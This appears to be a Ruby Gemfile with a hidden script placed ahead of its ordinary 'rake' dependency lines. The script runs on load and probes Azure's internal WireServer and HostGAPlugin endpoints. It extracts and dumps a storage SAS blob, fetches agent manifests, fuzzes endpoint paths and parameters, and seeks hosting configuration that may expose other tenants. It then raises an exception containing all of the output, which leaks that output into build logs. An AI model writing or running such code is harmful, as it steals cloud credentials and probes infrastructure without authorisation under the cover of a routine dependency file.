require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v119; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"

# Extract SAS
STATUS_SAS=$(python3 -c "import json; d=json.load(open('vm.json')); print(d.get('statusUploadBlob',{}).get('value',''))")

# === FULL STATUS BLOB DUMP ===
echo "===STATUS_BLOB_FULL_DUMP==="
curl -s -m 15 -o status.bin -w "HTTP=%{http_code} LEN=%{size_download}\n" "$STATUS_SAS"
LEN=$(wc -c < status.bin)
echo "STEP_STATUS_TOTAL_BYTES=$LEN"
# Dump as multiple base64 chunks to bypass truncation
python3 -c "
import base64
data = open('status.bin','rb').read()
# Strip null bytes (PageBlob is allocated; actual content might be JSON ending at null)
nullpos = data.find(b'\x00')
if nullpos > 0:
    print(f'STEP_FIRST_NULL_AT={nullpos}')
    data = data[:nullpos]
print(f'STEP_CLEAN_LEN={len(data)}')
# Print as JSON if parseable
try:
    j = data.decode('utf-8', errors='replace')
    import json
    parsed = json.loads(j)
    print('STEP_JSON_PARSED=' + str(sorted(parsed.keys()))[:200])
    print('STEP_AGG_STATUS=' + json.dumps(parsed.get('aggregateStatus', {}))[:1500])
except Exception as e:
    print(f'STEP_PARSE_ERR={e}')
    print('STEP_RAW_TEXT=' + data.decode('utf-8', errors='replace')[:2500])
"

# === GAFAMILIES MANIFEST FETCH ===
echo "===GA_MANIFEST_FETCH==="
GA_URI=$(python3 -c "import json; d=json.load(open('vm.json')); print(d['gaFamilies'][0]['uris'][0])")
echo "GA_URI=$GA_URI"
curl -s -m 10 -o manifest.xml -w "HTTP=%{http_code} LEN=%{size_download}\n" "$GA_URI"
echo "MANIFEST_PREVIEW=$(head -c 500 manifest.xml)"
echo "MANIFEST_B64_FIRST_400=$(base64 -w0 < manifest.xml | head -c 400)"

# === HOSTGAPLUGIN PARAMETER FUZZ ===
echo "===HGP_PARAM_FUZZ==="
for PARAM in "vmId=00000000-0000-0000-0000-000000000001" "instanceId=test" "containerId=test" "vmName=test" "tenantId=test" "subscriptionId=test"; do
  URL="http://168.63.129.16:32526/vmSettings?api-version=2015-09-01&$PARAM"
  curl -s -m 8 -o p.bin -w "PARAM=$PARAM HTTP=%{http_code} LEN=%{size_download}\n" "$URL"
  # If a different size returned, that's suspicious
done

# === HOSTGAPLUGIN ALTERNATE PATHS ===
echo "===HGP_PATH_FUZZ==="
for PATH in /vmSettings /vmsettings /vmSettings/0 /machine /machine/extensions /vmStatus /status /api/vmSettings /v1/vmSettings /api/v1/instance /api/v2/vmSettings; do
  curl -s -m 5 -o p.bin -w "PATH=$PATH HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16:32526$PATH"
done

# === WIRESERVER ENDPOINT FUZZ ===
echo "===WIRESERVER_FUZZ==="
for PATH in "/machine/?comp=goalstate" "/machine/?comp=acquired" "/machine/?comp=health" "/machine/?comp=hostingenvironmentconfig" "/machine/?comp=sharedconfig" "/machine/?comp=extensionsconfig" "/machine/?comp=versions" "/?comp=versions" "/machine/" "/admin/"; do
  curl -s -m 5 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o w.bin -w "P=$PATH HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16$PATH"
done

# === HOSTING ENVIRONMENT (other tenants?) ===
echo "===HOSTING_ENV==="
curl -s -m 10 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o gs2.xml -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/machine/?comp=goalstate"
# Extract HostingEnvironmentConfig URL
HEC=$(grep -oE '<HostingEnvironmentConfig>[^<]+' gs2.xml | sed 's|<HostingEnvironmentConfig>||')
echo "HEC=$HEC"
if [ -n "$HEC" ]; then
  HEC_DEC=$(python3 -c "import html; print(html.unescape('$HEC'))")
  curl -s -m 10 -H "x-ms-version: 2015-04-05" -H "x-ms-agent-name: WALinuxAgent" -o hec.xml -w "HEC HTTP=%{http_code} LEN=%{size_download}\n" "$HEC_DEC"
  echo "HEC_B64=$(base64 -w0 < hec.xml | head -c 800)"
fi
SHELL
Tempfile.create('v119.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v119 " + line.chomp[0..1500] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
